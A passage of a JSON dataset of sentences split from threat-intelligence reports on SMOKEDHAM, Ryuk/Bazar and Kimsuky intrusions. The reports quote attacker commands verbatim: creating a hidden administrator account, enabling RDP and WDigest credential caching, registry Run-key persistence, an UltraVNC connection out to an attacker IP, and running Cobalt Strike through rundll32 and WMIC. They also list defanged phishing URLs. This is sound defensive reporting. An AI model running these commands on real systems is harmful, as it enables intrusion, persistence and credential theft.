        "text": "The following commands were used to collect information about the system and logged in users.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S65",
        "text": "- net.exe user net.exe users",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S66",
        "text": "- whoami.exe whoami.exe /priv systeminfo.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S67",
        "text": "The following commands were used to create and add the DefaultUser account to the local Administrators group, and subsequently hide the account from the Windows logon screen.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S68",
        "text": "net.exe user DefaultUser REDACTED /ADD net.exe localgroup Administrators DefaultUser /ADD reg.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S69",
        "text": "ADD 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList' /v DefaultUser",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S70",
        "text": "/t REG_DWORD /d 0 /f",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S71",
        "text": "The following commands facilitated lateral movement by modifying Terminal Server registry key values to enable multiple Remote Desktop connection sessions, and modifying the Local Security Authority (LSA) registry key value to require a password for authentication.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S72",
        "text": "reg.exe ADD 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f reg.exe ADD 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v fSingleSessionPerUser /t REG_DWORD /d 0 /f reg.exe ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v LimitBlankPasswordUse /t REG_DWORD /d 1 /f\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S73",
        "text": "Additionally, SMOKEDHAM modified the WDigest registry key value HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential to enable credential caching.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S74",
        "text": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S75",
        "text": "These files were saved to the %APPDATA%\\Chrome\\ directory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S76",
        "text": "The UltraVNC.ini file allowed UltraVNC to connect to port 6300 on the loopback address specified by the parameter AllowLoopback=1.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S77",
        "text": "SMOKEDHAM was observed using UltraVNC to establish a connection to the IP address and port pair 81.91.177[.]54[:]7234 that has been observed in past UNC2465 intrusions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S78",
        "text": "%APPDATA%\\Chrome\\winvnc.exe' -autoreconnect ID:15000151 -connect 81.91.177[.]54[:]7234 \u2013run\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S79",
        "text": "SMOKEDHAM created a persistence mechanism for UltraVNC by adding the application to the ConhostNT value under the current users Run registry key.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S80",
        "text": "reg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ConhostNT /d %appdata%\\Chrome\\winvnc.exe\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S81",
        "text": "SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S82",
        "text": "These files were stored in the C:\\ProgramData\\WindNT\\ directory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S83",
        "text": "NGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S84",
        "text": "The execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S85",
        "text": "SMOKEDHAM created a persistence mechanism for NGROK by adding VirtualHost.vbs to the WindNT value under the current users Run registry key.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S86",
        "text": "reg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindNT /d C:\\ProgramData\\WindNT\\VirtualHost.vbs\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S87",
        "text": "This attacker utilized an additional keylogging utility named C:\\ProgramData\\psh\\console.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S88",
        "text": "The keylogging utility was configured to capture and record keystrokes to C:\\ProgramData\\psh\\System32Log.txt.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S89",
        "text": "Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S90",
        "text": "The downloaded files were named desktop.lnk and console.lnk, respectively, and were placed in the following persistence locations:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S91",
        "text": "C:\\Users\\[username]\\Start Menu\\Programs\\Startup\\desktop.lnk %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.lnk %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\console.lnk",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S92",
        "text": "The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S93",
        "text": "Update.exe was a Go based dropper created using the ScareCrow framework.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S94",
        "text": "The attacker executed C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe using Command Prompt.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S95",
        "text": "cmd.exe /c 'C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe'&&exit",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S96",
        "text": "The execution of ScareCrow framework dropper C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe resulted in the creation of a Cobalt Strike stageless payload to C:\\ProgramData\\Cisco\\update.exe, which then established a connection to a Cobalt Strike Beacon server located at w2doger[.]xyz when executed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S97",
        "text": "Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S98",
        "text": "Mandiant was not able to recover update.lnk at the time of writing, but suspects that this file was created to add persistence to the Cobalt Strike stageless payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S99",
        "text": "Mandiant observed this attacker dump the LSASS process using Task Manager to a file named lsass.DMP, and later, zip the dump into two files named lsass.zip and lsass2.zip located in the C:\\ProgramData\\psh\\ directory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S100",
        "text": "From this point, the attacker was observed moving laterally to different systems in the environment using Remote Desktop Protocol (RDP) connections.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S0",
        "text": "In our previous Ryuk case, we saw the threat actors leverage access to an environment via the Bazar Loader malware.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S1",
        "text": "This time around, we saw them accomplish their objective faster, but the general tactics and techniques stayed similar between incidents.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S2",
        "text": "Bazar was introduced to the environment again with the delivery via phishing emails.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S3",
        "text": "For an in depth breakdown on this loader, see this analysis by Roman Marshanski & Vitali Kremez.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S4",
        "text": "Bazar, once running, was seen again injecting into explorer.exe, svchost.exe, and spawning command shell processes.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S5",
        "text": "From this loader we saw initial mapping of the domain, using built-in windows utilities such as Nltest.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S6",
        "text": "However, unlike the last case, the threat actors started at a lower privileged user and rather than proceed slowly or cautiously, they exploited the recently disclosed Zerologon vulnerability (CVE-2020-1472) to reset the machine password of the primary domain controller.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S7",
        "text": "Lateral movement was initiated via SMB file transfers and WMI executions of Cobalt Strike Beacons.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S8",
        "text": "The network indicators align similarly to the prior campaign and were noted by Kyle Ehmke in response to our last post pivoting off the prior report\u2019s intel.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S9",
        "text": "From memory analysis, we were also able to conclude the actors were using a trial version of Cobalt Strike with the EICAR string present in the network configuration for the beacon.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S10",
        "text": "Both portable executable and DLL beacons were used.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S11",
        "text": "After moving laterally to the secondary domain controller, the threat actor started on more domain discovery via Net and the PowerShell Active Directory module.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S12",
        "text": "From there, the threat actors appeared to use the default named pipe privilege escalation module on the server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S13",
        "text": "At this point, the threat actors used RDP to connect from the secondary domain controller, to the first domain controller, using the built in Administrator account.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S14",
        "text": "Once on the main domain controller, another Cobalt Strike beacon was dropped and executed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S15",
        "text": "Then more domain reconnaissance was performed using AdFind.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S16",
        "text": "Once this completed, at the four hour mark, the threat actors were ready for their final objective.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S17",
        "text": "Four hours and 10 minutes in, the threat actors used the pivot from the primary domain controller to RDP into the Backup server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S18",
        "text": "Backup servers were again targeted first for deployment of the ransomware executable, followed by servers and then workstations.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S19",
        "text": "The threat actors finished their objective by executing the ransomware on the primary domain controller, and at the 5 hour mark, the attack completed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S20",
        "text": "While last time we commented on the lead time between the first and second day to aid detection and response activity, this case goes to show that you can\u2019t count on that kind of timescale.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S21",
        "text": "You need to be ready to act in less than an hour, to make sure you can effectively disrupt the threat actor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S22",
        "text": "Access was initiated by a phishing email leading to the Bazar Loader malware executable.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S23",
        "text": "Bazar relies on user execution of an executable to run.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S24",
        "text": "This user was a Domain User and did not have any other permissions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S25",
        "text": "CVE-2020-1472 was used to reset the credentials on one of the domain controllers in the environment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S26",
        "text": "After resetting the password, the threat actors then targeted a different domain controller, potentially due to breaking services by use of their exploit.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S27",
        "text": "Packet showing the zeroed out password.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S28",
        "text": "On one of the domain controllers we saw use of the Cobalt Strike named pipe escalation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S29",
        "text": "C:\\Windows\\system32\\cmd.exe /c echo 92d8cc45954 >; \\\\.\\pipe\\446b3c",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S30",
        "text": "On the first domain controller that the treat actors connected to after their initial connection, they dropped a DLL and executed it via rundll32.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S31",
        "text": "C:\\Windows\\system32\\cmd.exe /C rundll32 C:\\Windows\\system32\\SQL.dll, StartW",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S32",
        "text": "Dropped via RDP and executed via rundll32 on the second domain controller.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S33",
        "text": "rundll32 C:\\PerfLogs\\arti64.dll, rundll",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S34",
        "text": "Shortly after, the DLL was called again via regsrv32.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S35",
        "text": "regsvr32 C:\\PerfLogs\\arti64.dll",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S36",
        "text": "Then a 2nd DLL was dropped and executed in a similar manner on the 2nd DC.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S37",
        "text": "rundll32 C:\\\\PerfLogs\\\\socks64.dll, rundll",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S38",
        "text": "Ran on the beachhead.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S39",
        "text": "nltest /domain_trusts /all_trusts nltest /dclist:DOMAIN net group \"Domain admins\" /DOMAIN",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S40",
        "text": "Ran on a domain controller.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S41",
        "text": "net group \"enterprise admins\" /domain nltest /domain_trusts /all_trusts nltest /dclist:\"DOMAIN\" ping DOMAINCONTROLLER cmd.exe /C time net user administrator /domain",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S42",
        "text": "Then they imported the PowerShell Active Directory module.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S43",
        "text": "They then ran the following looking for host names, operating systems and last logon dates of all AD systems.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S44",
        "text": "C:\\Windows\\system32\\cmd.exe /C Get-ADComputer -Filter {enabled -eq $true} -properties *|select Name, DNSHostName, OperatingSystem, LastLogonDate |",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S45",
        "text": "Export-CSV C:\\Users\\AllWindows.csv -NoTypeInformation -Encoding UTF8",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S46",
        "text": "After already completing the above discovery work and having already pivoted to their 2nd domain controller, the threat actors moved on to AdFind for further domain reconnaissance.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S47",
        "text": "C:\\Windows\\Temp\\adf\\AdFind.exe C:\\Windows\\Temp\\adf\\adf.bat",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S48",
        "text": "Contents of the script ran the following with AdFind.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S49",
        "text": "adfind.exe -f \"(objectcategory=person)\" adfind.exe -f \"objectcategory=computer\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S50",
        "text": "adfind.exe -f \"(objectcategory=organizationalUnit)\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S51",
        "text": "adfind.exe -sc trustdmp",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S52",
        "text": "adfind.exe -subnets -f (objectCategory=subnet) adfind.exe -f \"(objectcategory=group)\" adfind.exe -gcb -sc trustdmp",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S53",
        "text": "The threat actor then ran this command a few times.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S54",
        "text": "nltest /domain_trusts /all_trusts",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S55",
        "text": "The first lateral movement occurred to the domain controller not affected by the use of CVE-2020-1472.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S56",
        "text": "An executable was transferred to it via SMB using a domain administrator account.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S57",
        "text": "After transferring the exe, the threat actors utilized WMI from the beachhead host to execute the file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S58",
        "text": "C:\\Windows\\system32\\cmd.exe /C WMIC/node:\"DC.DOMAIN.local\" process call create \"cmd /c C:\\PerfLogs\\servisess.exe\\\"\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S59",
        "text": "The presence of the EICAR strings point to the Cobalt Strike software being used as a trial version.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S60",
        "text": "They accessed the GPO\u2019s for the domain but none were modified or added.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S61",
        "text": "mmc.exe\" \"C:\\Windows\\System32\\gpedit.msc\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S62",
        "text": "Shortly there after we saw a Cobalt Strike DLL transferred via the RDP connection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S63",
        "text": "RDP was used to pivot from the main domain controller and distribute the final ransomware payload enterprise wide.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S64",
        "text": "After our previous report, @kyleehmke pivoted off of our prior Ryuk report and used the network data to link several of these domains which we saw in this case.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S65",
        "text": "Starting around 4.5 hours after the initial Bazar malware was executed, the Ryuk threat actors acted on their final objectives and initiated RDP connections from the domain controller previously exploited, to the rest of the environment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S66",
        "text": "This time they initiated the ransomware first on the secondary domain controller (their 1st pivot) and transferred the Ryuk executable over the RDP connection.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S0",
        "text": "<Title> *** Kimsuky APT continues to target South Korean government using AppleSeed backdoor *** </Title>",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S1",
        "text": "Posted: June 1, 2021 by",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S2",
        "text": "Kimsuky, the North Korean threat actor active since 2012, is still targeting the South Korean government.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S3",
        "text": "We take a look at the phishing infrastructure and command and control mechanisms of this APT.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S4",
        "text": "This blog post was authored by Hossein Jazi.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S5",
        "text": "The Kimsuky APT\u2014also known as Thallium, Black Banshee, and Velvet Chollima\u2014is a North Korean threat actor that has been active since 2012.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S6",
        "text": "The group conducts cyber espionage operations to target government entities mainly in South Korea.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S7",
        "text": "On December 2020, KISA (Korean Internet & Security Agency) provided a detailed analysis about the phishing infrastructure and TTPs used by Kimsuky to target South Korea.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S8",
        "text": "The Malwarebytes Threat Intelligence team is actively monitoring this actor and has been able to spot phishing websites, malicious documents, and scripts that have been used to target high profile people within the government of South Korea.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S9",
        "text": "The structure and TTPs used in these recent activities align with what has been reported in KISA's report.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S10",
        "text": "Targets",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S11",
        "text": "One of the lures used by Kimsuky named \"\uc678\uad50\ubd80 \uac00\ud310 2021-05-07\" in Korean language translates to \"Ministry of Foreign Affairs Edition 2021-05-07\" which indicates that it has been designed to target the Ministry of Foreign Affairs of South Korea.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S12",
        "text": "According to our collected data, we have identified that it is one entity of high interest for Kimsuky.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S13",
        "text": "Other targets associated with the Korean government include:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S14",
        "text": "Ministry of Foreign Affairs, Republic of Korea 1st Secretary\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S15",
        "text": "Ministry of Foreign Affairs, Republic of Korea 2nd Secretary\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S16",
        "text": "Trade Minister",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S17",
        "text": "Deputy Consul General at Korean Consulate General in Hong Kong",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S18",
        "text": "International Atomic Energy Agency (IAEA) Nuclear Security Officer",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S19",
        "text": "Ambassador of the Embassy of Sri Lanka to the State",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S20",
        "text": "Ministry of Foreign Affairs and Trade counselor\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S21",
        "text": "Beside targeting government, we also have observed that Kimsuky collected information about universities and companies in South Korea including the Seoul National University and Daishin financial security company as well as KISA.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S22",
        "text": "This does not mean the threat actors actively targeted them yet nor that they were compromised.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S23",
        "text": "Phishing Infrastructure",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S24",
        "text": "The group has the capability to set up phishing infrastructure to mimic well known websites and trick victims to enter their credentials.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S25",
        "text": "This is one of the main methods used by this actor to collect email addresses that later will be used to send spearphishing emails.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S26",
        "text": "The group is still using similar phishing models previously mentioned in the KISA report with some small changes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S27",
        "text": "As an example, they have added the Mobile_detect and Anti_IPs modules from type B to type C (KISA report) in order to be able to detect mobile devices and adjust the view based on that.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S28",
        "text": "This phishing model has the capability to show phishing pages in English or Korean based on the parameter value received from the phishing email.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S29",
        "text": "This model has been deployed by Kimsuky to target not only Korean speaking victims but also English speaking people, as well.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S30",
        "text": "Figure 1: Phishing service model",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S31",
        "text": "We have observed that they developed different phishing techniques to mimic the following web services and steal credentials:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S32",
        "text": "Gmail",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S33",
        "text": "Hotmail",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S34",
        "text": "Microsoft Outlook\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S35",
        "text": "Nate",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S36",
        "text": "Daum",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S37",
        "text": "Naver",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S38",
        "text": "Telegram",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S39",
        "text": "KISA",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S40",
        "text": "Figure 2: Nate phishing page developed by Kimsuky APT",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S41",
        "text": "We have identified several URLs used by Kimsuky to host their phishing infrastructure:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S42",
        "text": "http://accounts[.]goggle[.]hol[.]es",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S43",
        "text": "/MyAccount",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S44",
        "text": "https://myaccount[.]google[.]newkda[.]com",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S45",
        "text": "/signin",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S46",
        "text": "http://myaccount[.]google[.]newkda[.]com",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S47",
        "text": "/signin",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S48",
        "text": "http://myaccount[.]google[.]nkaac[.]net",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S49",
        "text": "/signin",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S50",
        "text": "https://myaccounts",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S51",
        "text": "-",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S52",
        "text": "gmail[.]autho[.]co",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S53",
        "text": "/signin",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S54",
        "text": "http://myaccounts-gmail[.]kr-infos[.]com/signin",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S55",
        "text": "http://myaccount[.]cgmail[.]pe[.]hu",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S56",
        "text": "/signin",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S57",
        "text": "https://accounts[.]google",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S58",
        "text": "-",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S59",
        "text": "manager[.]ga",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S60",
        "text": "/",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S61",
        "text": "signin",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S62",
        "text": "https://accounts[.]google",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S63",
        "text": "-",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S64",
        "text": "signin[.]ga",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S65",
        "text": "/v2",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S66",
        "text": "https://myaccount[.]google-signin[.]ga/signin",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S67",
        "text": "https://account[.]grnail",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S68",
        "text": "-",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S69",
        "text": "signin[.]ga",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S70",
        "text": "/v2",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S71",
        "text": "https://myaccount[.]grnail",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S72",
        "text": "-",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S73",
        "text": "signin[.]ga",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S74",
        "text": "/v2",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S75",
        "text": "https://myaccounts[.]grnail",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S76",
        "text": "-",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S77",
        "text": "signin[.]ga",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S78",
        "text": "/v2",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S79",
        "text": "https://accounts[.]grnail",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S80",
        "text": "-",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S81",
        "text": "signin[.]ga",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S82",
        "text": "/v2",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S83",
        "text": "https://protect[.]grnail",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S84",
        "text": "-",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S85",
        "text": "signin[.]ga",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S86",
        "text": "/v2",
        "type": ""
    },
    {
